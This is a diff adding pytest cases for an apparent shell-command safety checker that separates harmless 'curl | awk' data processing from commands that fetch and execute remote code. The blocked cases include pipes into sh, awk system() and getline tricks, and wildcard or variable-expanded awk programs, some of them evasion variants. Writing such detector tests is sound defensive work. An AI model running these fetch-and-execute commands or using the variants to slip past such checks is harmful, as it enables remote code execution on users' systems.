@@ -692,3 +692,52 @@ def test_remote_fetch_amend_unknown_ansi_fetch(fetcher: str, prefix: str, suffix
     encoded = f"{fetcher[0]}$'\\x{ord(fetcher[1]):02x}'{fetcher[2:]}"
     command = f"{prefix}{encoded} url | {suffix}"
     assert remote_fetch_execution(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s -o /dev/null -w '%{http_code} %{time_total}\\n' "
+        "http://localhost:60887/api/health | awk '{print $2}'",
+        "curl -s https://example.com/stats | awk -F, -v OFS=: '$1 == \"x\" {print $2, NR}'",
+        "curl -s https://example.com/x | gawk -- '{s += $1} END {print s}'",
+        "for i in 1 2; do curl -s -w '%{time_total}\\n' -o /dev/null http://127.0.0.1/; done"
+        " | awk '{s+=$1} END {print s/NR}'",
+        "curl -s https://example.com/x | awk '!seen[$NF]++'",
+        "curl -s https://example.com/x | awk '{print $1*2}'",
+        # Saving fetched data matches plain `curl url > run.sh`; running the file is blocked.
+        "curl -s https://example.com/x | awk '{print}' > run.sh",
+    ],
+)
+def test_remote_fetch_into_literal_awk_program_is_data(command: str) -> None:
+    assert not remote_fetch_execution(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s https://example.com/x | awk '{system($0)}'",
+        "curl -s https://example.com/x | awk '{print | \"sh\"}'",
+        "curl -s https://example.com/x | awk '{print > \"run.sh\"}'",
+        "curl -s https://example.com/x | awk '{\"sh\" | getline}'",
+        "curl -s https://example.com/x | gawk '@load \"x\"; {print}'",
+        "curl -s https://example.com/x | awk -f prog.awk",
+        "curl -s https://example.com/x | gawk -e '{print}' -E prog",
+        'awk "$(curl -s https://example.com/x)" data.txt',
+        'curl -s https://example.com/x | awk "$P"',
+        'curl -s https://example.com/x | awk -F, "${P}"',
+        "curl -s https://example.com/x | awk *",
+        "curl -s https://example.com/x | awk p?",
+        "curl -s https://example.com/x | awk ~/p",
+        "curl -s https://example.com/x | awk -- ~/p",
+        "curl -s https://example.com/x | awk $1*",
+        "curl -s https://example.com/x | awk *$1",
+        "curl -s https://example.com/x | awk $!*",
+        "curl -s https://example.com/x | awk *$",
+        "curl -s https://example.com/x | awk '{print}' > run.sh; sh run.sh",
+        "curl -s http://localhost:60887/x | sh",
+        "curl -s http://localhost:60887/x | awk '{print}' | sh",
+    ],
+)
+def test_remote_fetch_into_executing_awk_stays_blocked(command: str) -> None:
+    assert remote_fetch_execution(command)
